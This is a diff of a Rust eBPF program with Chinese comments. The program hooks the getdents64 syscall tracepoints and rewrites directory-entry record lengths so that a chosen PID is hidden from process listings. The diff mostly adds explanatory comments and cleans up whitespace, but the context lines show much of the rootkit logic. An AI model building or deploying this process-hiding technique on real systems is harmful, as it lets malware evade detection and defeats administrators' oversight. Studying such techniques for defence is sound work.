@@ -28,13 +28,19 @@ const PARCHER: u32 = 1;
 #[map]
 static JUMP_TABLE: ProgramArray = ProgramArray::with_max_entries(2, 0);
 
-// 存储 使用 sys_getdents64 的 pid_tgid 和 linux_dirent64 结构体首地址的映射
+// 存储使用 sys_getdents64 的 pid_tgid 和 linux_dirent64 结构体首地址的映射
 #[map]
 static map_buffs: HashMap<usize, u64> = HashMap::<usize, u64>::with_max_entries(8192, 0);
 
+// 存储 pid_tgid 和 获取目前 linux_dirent64 结构体数组的遍历偏移 的映射
 #[map]
 static map_bytes_read: HashMap<usize, usize> = HashMap::<usize, usize>::with_max_entries(8192, 0);
 
+// 记录上一次遍历到的位置
+// 主要是为了 handle_getdents_patch 函数使用，
+// 因为 handle_getdents_patch 函数需要知道上一个 linux_dirent64 结构体的大小
+// 以便于修正上一个 linux_dirent64 结构体的大小
+// 从而隐藏我们要隐藏的 pid
 #[map]
 static map_to_patch: HashMap<usize, usize> = HashMap::<usize, usize>::with_max_entries(8192, 0);
 
@@ -75,7 +81,6 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
 // sys_enter_getdents64 的收尾处理函数
 #[tracepoint]
 fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
-
     // 获得调用 sys_exit_getdents64 的进程的 pid 与 tgid
     // 用来判断是之前调用 sys_enter_getdents64 的进程
     let pid_tgid = bpf_get_current_pid_tgid() as usize;
@@ -114,7 +119,7 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
     // 所以我们最后还需要通过比对 char 数组来判断我们是否找到了要隐藏的 pid
     let mut filename: [u8; MAX_FILE_LEN] = [0; MAX_FILE_LEN];
 
-    // 记录当前遍历的偏移 
+    // 记录当前遍历的偏移
     let mut bpos: usize = 0;
 
     // 从 map_bytes_read 中获取目前 linux_dirent64 结构体数组的遍历偏移
@@ -137,7 +142,6 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
     // 通过 bpf_tail_call 再次调用这个函数进行遍历，
     // 直到找到对应的文件名
     for _ in 0..128 {
-
         // 如果当前遍历的位置大于等于总长度，说明已经遍历完了
         if bpos >= total_bytes_read as usize {
             break;
@@ -147,7 +151,6 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
         dirp = (buff_addr + bpos as u64) as *const linux_dirent64;
 
         unsafe {
-
             // 读取当前 linux_dirent64 结构体的 d_reclen 字段
             // 即这个结构体的大小
             bpf_probe_read_user(
@@ -195,7 +198,7 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
                 // 如果写成这样：
                 // JUMP_TABLE.tail_call(&ctx, PROG_HANDLER).unwrap();
                 // 就会报错 ——
-                // Error: the BPF_PROG_LOAD syscall failed. 
+                // Error: the BPF_PROG_LOAD syscall failed.
                 // Verifier output: last insn is not an exit or jmp
                 // 这是因为 .unwrap() 如果 panic，
                 // 就会导致程序进入不可达的 panic_handler，
@@ -250,7 +253,6 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
 // 从而隐藏我们要隐藏的 pid
 #[tracepoint]
 fn handle_getdents_patch(ctx: TracePointContext) -> Result<u32, u32> {
-
     // 获得调用 sys_exit_getdents64 的进程的 pid 与 tgid
     // 判断是否是之前调用 sys_enter_getdents64 的进程
     let pid_tgid = bpf_get_current_pid_tgid() as usize;
@@ -262,8 +264,7 @@ fn handle_getdents_patch(ctx: TracePointContext) -> Result<u32, u32> {
     }
     let &pbuff_addr = pbuff_addr.unwrap();
 
-
-    // 转换一下类型 
+    // 转换一下类型
     let dirp_previous = pbuff_addr as *mut linux_dirent64;
 
     // 记录上一个 linux_dirent64 结构体的 d_reclen 字段
